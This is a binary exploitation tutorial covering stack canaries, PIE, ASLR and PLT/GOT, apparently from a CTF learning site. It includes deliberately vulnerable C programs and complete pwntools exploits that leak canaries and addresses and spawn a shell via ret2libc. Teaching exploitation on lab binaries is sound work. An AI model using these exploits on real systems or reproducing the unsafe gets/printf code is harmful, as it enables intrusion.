# Binary Exploitation - Stack

> https://ir0nstone.gitbook.io/notes/

## Stack Canaries

The Buffer Overflow defense

Stack Canaries are very simple - at the beginning of the function, a random value is placed on the stack. Before the program executes `ret`, the current value of that variable is compared to the initial: if they are the same, no buffer overflow has occurred.

If they are not, the attacker attempted to overflow to control the return pointer, and the program crashes, often with a `***stack smashing detected***` error message.

On Linux, stack canaries end in `00`. This is so that they null-terminate any strings in case you make a mistake when using print functions, but it also makes them much easier to spot.

### Bypassing Canaries

There are two ways to bypass a canary.

#### Leaking it

This is quite broad and will differ from binary to binary, but the main aim is to read the value. The simplest option is using **format string** if it is present - the canary, like other local variables, is on the stack, so if we can leak values off the stack it's easy.

##### Source

```c
#include <stdio.h>

void vuln() {
    char buffer[64];

    puts("Leak me");
    gets(buffer);

    printf(buffer);
    puts("");

    puts("Overflow me");
    gets(buffer);
}

int main() {
    vuln();
}

void win() {
    puts("You won!");
}
```

The source is very simple - it gives you a format string vulnerability, then a buffer overflow vulnerability. The format string we can use to leak the canary value, then we can use that value to overwrite the canary with itself. This way, we can overflow past the canary but not trigger the check as its value remains constant. And of course, we just have to run `win()`.

##### 32-bit

[canary-32](../assets/canary-32.zip)

First, let's check if there **is** a canary:

```bash
$ pwn checksec vuln-32 
[*] 'vuln-32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Yup, there is. Now we need to calculate at what offset the canary is at and to do this we'll use radare2.

```bash
$ r2 -d -A vuln-32

[0xf7f2e0b0]> db 0x080491d7
[0xf7f2e0b0]> dc
Leak me
%p
hit breakpoint at: 80491d7
[0x080491d7]> pxw @ esp
0xffd7cd60  0xffd7cd7c 0xffd7cdec 0x00000002 0x0804919e  |...............
0xffd7cd70  0x08048034 0x00000000 0xf7f57000 0x00007025  4........p..%p..
0xffd7cd80  0x00000000 0x00000000 0x08048034 0xf7f02a28  ........4...(*..
0xffd7cd90  0xf7f01000 0xf7f3e080 0x00000000 0xf7d53ade  .............:..
0xffd7cda0  0xf7f013fc 0xffffffff 0x00000000 0x080492cb  ................
0xffd7cdb0  0x00000001 0xffd7ce84 0xffd7ce8c 0xadc70e00  ................
```

The last value there is the canary. We can tell because it's roughly 64 bytes after the "buffer start", which should be close to the end of the buffer. Additionally, it ends in `00` and looks very random, unlike the libc and stack addresses that start with `f7` and `ff`. If we count the number of addresses it's around 24 until that value, so we go one before and one after as well to make sure.

```bash
$./vuln-32

Leak me
%23$p %24$p %25$p
0xa4a50300 0xf7fae080 (nil)
```

It appears to be at `%23$p`. Remember, stack canaries are randomized for each new process, so it won't be the same.

Now let's just automate grabbing the canary with pwntools:

```python
from pwn import *

p = process('./vuln-32')

log.info(p.clean())
p.sendline('%23$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')
```

```bash
$ python3 exploit.py 
[+] Starting local process './vuln-32': pid 14019
[*] b'Leak me\n'
[+] Canary: 0xcc987300
```

Now all that's left is to work out what the offset is until the canary, and then the offset from after the canary to the return pointer.

```bash
$ r2 -d -A vuln-32
[0xf7fbb0b0]> db 0x080491d7
[0xf7fbb0b0]> dc
Leak me
%23$p
hit breakpoint at: 80491d7
[0x080491d7]> pxw @ esp
[...]
0xffea8af0  0x00000001 0xffea8bc4 0xffea8bcc 0xe1f91c00
```

We see the canary is at `0xffea8afc`. A little later on the return pointer (we assume) is at `0xffea8b0c`. Let's break just after the next `gets()` and check what value we overwrite it with (we'll use a De Bruijn pattern).

```
[0x080491d7]> db 0x0804920f
[0x080491d7]> dc
0xe1f91c00
Overflow me
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA
hit breakpoint at: 804920f
[0x0804920f]> pxw @ 0xffea8afc
0xffea8afc  0x41574141 0x41415841 0x5a414159 0x41614141  AAWAAXAAYAAZAAaA
0xffea8b0c  0x41416241 0x64414163 0x41654141 0x41416641  AbAAcAAdAAeAAfAA
```

Now we can check the canary and EIP offsets:

```
[0x0804920f]> wopO 0x41574141
64
[0x0804920f]> wopO 0x41416241
80
```

The returned pointer is 16 bytes after the canary start, so 12 bytes after the canary.

```python
from pwn import *

p = process('./vuln-32')

log.info(p.clean())
p.sendline('%23$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

payload = b'A' * 64
payload += p32(canary)  # overwrite canary with original value to not trigger
payload += b'A' * 12    # pad to return pointer
payload += p32(0x08049245)

p.clean()
p.sendline(payload)

print(p.clean().decode('latin-1'))
```

##### 64-bit

Same source, same approach, just 64-bit. Try it yourself before checking the solution.

> Remember, in 64-bit format string goes to the relevant registers first and the addresses can fit 8 bytes each so the offset may be different.

[canary-64](../assets/canary-64.zip)

### Bruteforcing the Canary

This *is* possible on 32-bit, and sometimes unavoidable. It's not, however, feasible on 64-bit.

As you can expect, the general idea is to run the process loads and load of times with random canary values until you get a hit, which you can differentiate by the presence of a known plaintext, e.g. `flag{` and this can take ages to run and is frankly not a particularly interesting challenge.

## PIE

> Position Independent Code

### Overview

PIE stands for **Position Independent Executable**, which means that every time you run the file it gets **loaded into a different memory address**. This means you cannot hardcode values such as function addresses and gadget locations without finding out where they are.

### Analysis

Luckily, this does *not* mean it's impossible to exploit. PIE executables are based on **relative** rather than **absolute** addresses, meaning that while the locations in memory are fairly random the offsets between different **parts of the binary** remain **constant**. For example, if you know that the function `main` is located `0x128` bytes in memory after the base address of the binary, and you somehow find the location of `main`, you can simply subtract `0x128` from this to get the base address and from the addresses of everything else.

### Exploitation

So, all we need to do is find a *single* address and PIE is bypassed. Where could we leak this address from?

The stack of course!

We know that the **return pointer** is located on the stack - and much like a canary, we can use format string (or other ways) to read the value of the stack. The value will always be a static offset away from the binary base, enabling us to completely bypass PIE!

### Double-Checking

Due to the way PIE randomization works, the base address of a PIE executable will **always** end in the hexadecimal characters `000`. This is because **pages** are the things being randomized in memory, which have a standard size of `0x1000`. Operating Systems keep track of page tables that point to each section of memory and define the permissions for each section, similar to segmentation.

Checking the base address ends in `000` should *probably* be the first thing you do if your exploit is not working as you expected.

### Pwntools, PIE, and ROP

As shown in the [pwntools ELF tutorial](https://ir0nstone.gitbook.io/notes/other/pwntools/elf), pwntools has a host of functionality that allows you to really make your exploit dynamic. Simply setting `elf.address` will automatically update all the function and symbols addresses for you, meaning you don't have to worry about using `readelf` or other command line tools, but instead can receive it all dynamically.

Not to mention that the [ROP capabilities](https://ironstone.gitbook.io/notes/pwntools/rop) are incredibly powerful as well.

### PIE Bypass with Given Leak

> Exploiting PIE with a given leak

#### The Source

[pie-32](../assets/pie-32.zip)

```c
#include <stdio.h>

int main() {
    vuln();

    return 0;
}

void vuln() {
    char buffer[20];

    printf("Main Function is at: %lx\n", main);

    gets(buffer);
}

void win() {
    puts("PIE bypassed! Great job :D");
}
```

Pretty simple - we print the address of the `main`, which we can read and calculate the base address from. Then, using this, we can calculate the address of `win()` itself.

#### Analysis

Let's just run the script to make sure it's the right one :D

```bash
$ ./vuln-32 
Main Function is at: 0x5655d1b9
```

Yup, and as we expected, it prints the location of the `main`.

#### Exploitation

First, let's set up the script. We create an `ELF` object, which becomes very useful later on, and start the process.

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()
```

Now we want to take in the `main` function location. To do this we can simply receive up until it (and do nothing with that) and then read it.

```python
p.recvuntil('at: ')
main = int(p.recvline(), 16)
```

> Since we received the entire line except for the address, only the address will come up with `p.recvline()`.

Now we'll use the `ELF` object we created earlier and set its base address. The `sym` dictionary returns the offsets of the functions from the binary base until the base address is set, after which it returns the absolute address in memory.

```python
elf.address = main - elf.sym['main']
```

In this case, `elf.sym['main']` will return `0x11b9`; if we ran it again, it would return `0x11b9` + the base address. So, essentially, we're subtracting the offset of the `main` from the address we leaked to get the base of the binary.

Now we know the base we can just call `win()`.

```python
payload = b'A' * 32
payload += p32(elf.sym['win'])

p.sendline(payload)

print(p.clean().decode('latin-1'))
```

> By this point, I assume you know how to find the padding length and other stuff we've been mentioning for a while, so I won't be showing you every step of that.

And does it work?

```
[*] 'vuln-32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process 'vuln-32': pid 4617
PIE bypassed! Great job :D
```

Awesome!

#### Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

p.recvuntil('at: ')
main = int(p.recvline(), 16)

elf.address = main - elf.sym['main']

payload = b'A' * 32
payload += p32(elf.sym['win'])

p.sendline(payload)

print(p.clean().decode('latin-1'))
```

#### Summary

From the leaked address of the `main`, we were able to calculate the base address of the binary. From this, we could then calculate the address of the `win` and call it.

And one thing I would like to point out is how *simple* this exploit is. Look - it's 10 lines of code, at least half of which is scaffolding and setup.

#### 64-bit

Try this for yourself first, then feel free to check the solution. Same source, same challenge.

[pie-64](../assets/pie-64.zip)

### PIE Bypass

> Using format string

#### The Source

[pie-fmtstr](../assets/pie-fmtstr.zip)

```c
#include <stdio.h>

void vuln() {
    char buffer[20];

    printf("What's your name?\n");
    gets(buffer);
    
    printf("Nice to meet you ");
    printf(buffer);
    printf("\n");

    puts("What's your message?");

    gets(buffer);
}

int main() {
    vuln();

    return 0;
}

void win() {
    puts("PIE bypassed! Great job :D");
}
```

Unlike last time, we don't get given a function. We'll have to leak it with format strings.

#### Analysis

```bash
$ ./vuln-32 

What's your name?
%p
Nice to meet you 0xf7f6d080
What's your message?
hello
```

Everything's as we expect.

#### Exploitation

##### Setup

As last time, first, we set everything up.

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()
```

##### PIE Leak

Now we just need a leak. Let's try a few offsets.

```bash
$ ./vuln-32 
What's your name?
%p %p %p %p %p
Nice to meet you 0xf7eee080 (nil) 0x565d31d5 0xf7eb13fc 0x1
```

3rd one looks like a binary address, let's check the difference between the 3rd leak and the base address in radare2. Set a breakpoint somewhere after the format string leak (doesn't really matter where).

```bash
$ r2 -d -A vuln-32 

Process with PID 5548 started...
= attach 5548 5548
bin.baddr 0x565ef000
0x565f01c9]> db 0x565f0234
[0x565f01c9]> dc
What's your name?
%3$p
Nice to meet you 0x565f01d5
```

We can see the base address is `0x565ef000` and the leaked value is `0x565f01d5`. Therefore, subtracting `0x1d5` from the leaked address should give us the binary. Let's leak the value and get the base address.

```python
p.recvuntil('name?\n')
p.sendline('%3$p')

p.recvuntil('you ')
elf_leak = int(p.recvline(), 16)

elf.address = elf_leak - 0x11d5
log.success(f'PIE base: {hex(elf.address)}') # not required, but a nice check
```

Now we just need to send the exploit payload.

```python
payload = b'A' * 32
payload += p32(elf.sym['win'])

p.recvuntil('message?\n')
p.sendline(payload)

print(p.clean().decode())
```

#### Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

p.recvuntil('name?\n')
p.sendline('%3$p')

p.recvuntil('you ')
elf_leak = int(p.recvline(), 16)

elf.address = elf_leak - 0x11d5
log.success(f'PIE base: {hex(elf.address)}')

payload = b'A' * 32
payload += p32(elf.sym['win'])

p.recvuntil('message?\n')
p.sendline(payload)

print(p.clean().decode())
```

#### 64-bit

Same deal, just 64-bit. Try it out :)

[pie-fmtstr-64](../assets/pie-fmtstr-64.zip)

## ASLR

> Address Space Layout Randomisation

### Overview

ASLR stands for **A**ddress **S**pace **L**ayout **R**andomisation and can, in most cases, be thought of as `libc`'s equivalent of PIE - every time you run a binary, `libc` (and other libraries) get loaded into a different memory address.

> While it's tempting to think of ASLR as `libc` PIE, there is a key difference.
>
> ASLR is a **kernel protection** while PIE is a binary protection. The main difference is that PIE can be **compiled into the binary** while the presence of ASLR is **completely dependent on the environment running the binary**. If I sent you a binary compiled with ASLR disabled while I did it, it wouldn't make any difference at all if you had ASLR enabled.

Of course, as with PIE, this means you cannot hardcode values such as function address (e.g. `system` for a ret2libc).

### The Format String Trap

It's tempting to think that, as with PIE, we can simply format string for a libc address and subtract a static offset from it. Sadly, we can't quite do that.

When functions finish execution, they do not get removed from memory; instead, they just get ignored and overwritten. Chances are very high that you will grab one of these remnants with the format string. Different libc versions can act very differently during execution, so a value you just grabbed may not even *exist* remotely, and if it does the offset will most likely be different (different libcs have different sizes and therefore different offsets between functions). It's possible to get lucky, but you shouldn't really hope that the offsets remain the same.

Instead, a more reliable way is reading the [GOT entry of a specific function](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got#s-format-string).

### Double-Checking

For the same reason as PIE, libc base addresses always end in the hexadecimal characters `000`.

### ASLR Bypass with Given Leak

#### The Source

[aslr](../assets/aslr.zip)

```c
#include <stdio.h>
#include <stdlib.h>

void vuln() {
    char buffer[20];

    printf("System is at: %lp\n", system);

    gets(buffer);
}

int main() {
    vuln();

    return 0;
}

void win() {
    puts("PIE bypassed! Great job :D");
}
```

Just as we did for PIE, except this time we print the address of the system.

#### Analysis

```bash
$ ./vuln-32 
System is at: 0xf7de5f00
```

Yup, does what we expected.

> Your address of the system might end in different characters - you just have a different libc version

#### Exploitation

Much of this is as we did with PIE.

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()
```

Note that we include the libc here - this is just another `ELF` object that makes our lives easier.

Parse the address of the system and calculate the libc base from that (as we did with PIE):

```python
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')
```

Now we can finally ret2libc, using the `libc` `ELF` object to really simplify it for us:

```python
payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,        # return address
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```

#### Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,        # return address
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```

#### 64-bit

Try it yourself :)

[aslr-64](../assets/aslr-64.zip)

#### Using pwntools

If you prefer, you could have changed the following payload to be more pwntoolsy:

```python
payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,        # return address
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)
```

Instead, you could do:

```python
binsh = next(libc.search(b'/bin/sh'))

rop = ROP(libc)
rop.raw('A' * 32)
rop.system(binsh)

p.sendline(rop.chain())
```

The benefit of this is it's (arguably) more readable, but also makes it much easier to reuse in 64-bit exploits as all the parameters are automatically resolved for you.

### PLT and GOT

> Bypassing ASLR

The PLT and GOT are sections within an ELF file that deal with a large portion of the **dynamic linking**. Dynamically linked binaries are more common than statically linked binary in CTFs. The purpose of **dynamic linking** is that binaries do not have to carry all the code necessary to run within them - this reduces their size substantially. Instead, they rely on system libraries (especially `libc`, the C standard library) to provide the bulk of the functionality. For example, each ELF file will not carry its own version of `puts` compiled within it - it will instead dynamically link to the `puts` of the system it is on. As well as smaller binary sizes, this also means the user can continually upgrade their libraries, instead of having to redownload all the binaries every time a new version comes out.

**So when it's on a new system, it replaces function calls with hardcoded addresses?**

Not quite.

The problem with this approach is it requires `libc` to have a constant base address, i.e. be loaded in the same area of memory every time it's run, but remember that [***ASLR\***](https://en.wikipedia.org/wiki/Address_space_layout_randomization) exists. Hence the need for *dynamic* linking. Due to the way ASLR works, these addresses need to be resolved *every time the binary is run*. Enter the PLT and GOT.

### The PLT and GOT

The PLT (**Procedure Linkage Table**) and GOT (**Global Offset Table**) work together to perform the linking.

When you call `puts()` in C and compile it as an ELF executable, it is not *actually* `puts()` - instead, it gets compiled as `puts@plt`. Check it out in GDB:

![img](https://1919401647-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MEwBGnjPgf263kl5vWP%2Fsync%2F485781dd12eb3125bb8d6a6e4393d90fe8e212ae.png?generation=1597664138404840&alt=media)

Why does it do that?

Well, as we said, it doesn't know where `puts` actually are - so it jumps to the PLT entry of `puts` instead. From here, `puts@plt` does some very specific things:

- If there is a GOT entry for `puts`, it jumps to the address stored there.
- If there isn't a GOT entry, it will resolve it and jump there.

The GOT is a *massive* table of addresses; these addresses are the actual locations in memory of the `libc` functions. `puts@got`, for example, will contain the address of `puts` in memory. When the PLT gets called, it reads the GOT address and redirects execution there. If the address is empty, it coordinates with the `ld.so` (also called the **dynamic linker/loader**) to get the function address and store it in the GOT.

### How is this useful for binary exploitation?

Well, there are two key takeaways from the above explanation:

- Calling the PLT address of a function is equivalent to calling the function itself
- The GOT address contains addresses of functions in `libc`, and the GOT is within the binary.

The use of the first point is clear - if we have a PLT entry for a desirable `libc` function, for example, `system`, we can just redirect execution to its PLT entry and it will be the equivalent of calling the `system` directly; no need to jump into `libc`.

The second point is less obvious, but debatably even more important. As the GOT is part of the binary, it will always be a constant offset away from the base. Therefore, if PIE is disabled or you somehow leak the binary base, you know the exact address that contains a `libc` function's address. If you perhaps have an arbitrary read, it's trivial to leak the real address of the `libc` function and therefore bypass ASLR.

### Exploiting an Arbitrary Read

There are two main ways that I (personally) exploit an arbitrary read. Note that these approaches will cause not only the GOT entry to be returned but *everything else until a null byte is reached* as well, due to strings in C being null-terminated; make sure you only take the required number of bytes.

#### ret2plt

A **ret2plt** is a common technique that involves calling `puts@plt` and passing the GOT entry of puts as a parameter. This causes `puts` to print out its own address in `libc`. You then set the return address to the function you are exploiting in order to call it again and enable you to

```python
# 32-bit ret2plt
payload = flat(
    b'A' * padding,
    elf.plt['puts'],
    elf.symbols['main'],
    elf.got['puts']
)

# 64-bit
payload = flat(
    b'A' * padding,
    POP_RDI,
    elf.got['puts']
    elf.plt['puts'],
    elf.symbols['main']
)
```

> `flat()` packs all the values you give it with `p32()` and `p64()` (depending on context) and concatenates them, meaning you don't have to write the packing functions out all the time

#### %s format string

This has the same general theory but is useful when you have limited stack space or a ROP chain would alter the stack in such a way as to complicate future payloads, for example when stack pivoting.

```python
payload = p32(elf.got['puts'])      # p64() if 64-bit
payload += b'|'
payload += b'%3$s'                  # The third parameter points at the start of the buffer


# this part is only relevant if you need to call the function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])

# Send it off...

p.recvuntil(b'|')                   # This is not required
puts_leak = u32(p.recv(4))          # 4 bytes because it's 32-bit
```

### Summary

- The PLT and GOT do the bulk of static linking
- The PLT resolves actual locations in the `libc` of functions you use and stores them in the GOT
  - Next time that function is called, it jumps to the GOT and resumes execution there
- Calling `function@plt` is equivalent to calling the function itself
- An arbitrary read enables you to read the GOT and thus bypass ASLR by calculating the `libc` base